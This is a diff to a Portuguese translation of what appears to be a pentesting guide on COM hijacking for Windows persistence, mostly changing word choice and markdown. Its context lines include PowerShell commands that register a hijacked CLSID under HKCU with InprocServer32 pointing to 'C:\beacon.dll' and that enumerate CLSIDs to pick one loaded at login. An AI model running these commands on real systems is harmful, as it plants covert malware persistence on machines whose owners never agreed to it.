@@ -10,7 +10,7 @@ Como os valores de HKCU podem ser modificados pelos usuários, **COM Hijacking**
 - onde o _Resultado_ é **NOME NÃO ENCONTRADO**.
 - e o _Caminho_ termina com **InprocServer32**.
 
-Uma vez que você tenha decidido qual COM inexistente imitar, execute os seguintes comandos. _Tenha cuidado se decidir imitar um COM que é carregado a cada poucos segundos, pois isso pode ser excessivo._
+Uma vez que você tenha decidido qual COM inexistente impersonar, execute os seguintes comandos. _Tenha cuidado se decidir impersonar um COM que é carregado a cada poucos segundos, pois isso pode ser excessivo._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
@@ -51,7 +51,7 @@ Write-Host
 
 Verificando a saída, você pode selecionar uma que será executada **toda vez que um usuário fizer login**, por exemplo.
 
-Agora, ao procurar pelo CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** em **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** e em HKLM e HKCU, você geralmente encontrará que o valor não existe em HKCU.
+Agora, ao procurar pelo CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** em **HKEY\CLASSES\ROOT\CLSID** e em HKLM e HKCU, você geralmente encontrará que o valor não existe em HKCU.
 ```bash
 # Exists in HKCR\CLSID\
 Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"
